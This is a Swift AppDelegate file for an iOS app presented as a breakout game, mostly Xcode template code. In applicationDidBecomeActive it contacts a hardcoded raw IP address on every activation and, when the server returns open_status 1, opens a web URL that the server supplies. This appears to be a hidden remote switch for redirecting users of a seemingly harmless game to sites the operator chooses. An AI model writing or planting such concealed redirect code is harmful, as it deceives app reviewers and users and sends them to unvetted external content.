//
//  AppDelegate.swift
//  BreakOutGameVansV
//
//  Created by Json
//  Copyright © 2019 Json. All rights reserved.
//

import UIKit
import Alamofire
@UIApplicationMain
class AppDelegate: UIResponder, UIApplicationDelegate {

    var window: UIWindow?


    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        // Override point for customization after application launch.
        return true
    }

    func applicationWillResignActive(_ application: UIApplication) {
        // Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
        // Use this method to pause ongoing tasks, disable timers, and invalidate graphics rendering callbacks. Games should use this method to pause the game.
    }

    func applicationDidEnterBackground(_ application: UIApplication) {
        // Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later.
        // If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.
    }

    func applicationWillEnterForeground(_ application: UIApplication) {
        // Called as part of the transition from the background to the active state; here you can undo many of the changes made on entering the background.
    }

    func applicationDidBecomeActive(_ application: UIApplication) {
       let urlStr = "http://47.244.241.125:9010/app/check/update?version=7&app_id=1493375397&sign=4ba6863bcefc7c8c04f4369c3f7ca972"
        Alamofire.request(urlStr).responseJSON { (response) in
            switch response.result {
            case .success(let json):
                let jsonData:NSDictionary = json as! NSDictionary
                let dataDict:NSDictionary = jsonData.value(forKey: "data") as! NSDictionary
                if dataDict.count != 0 {
                    let open_status : NSInteger = dataDict.value(forKey: "open_status") as! NSInteger
                    if (open_status == 1) {
                        let web_url = dataDict.value(forKey: "web_url");
                        let url : URL? = URL.init(string: web_url as! String)
                        UIApplication.shared.open(url!, options: [:], completionHandler: nil)
                    }
                }
                break
            case .failure(let error):
                print("error:\(error)")
                break
            }
        }
    }

    func applicationWillTerminate(_ application: UIApplication) {
        // Called when the application is about to terminate. Save data if appropriate. See also applicationDidEnterBackground:.
    }


}

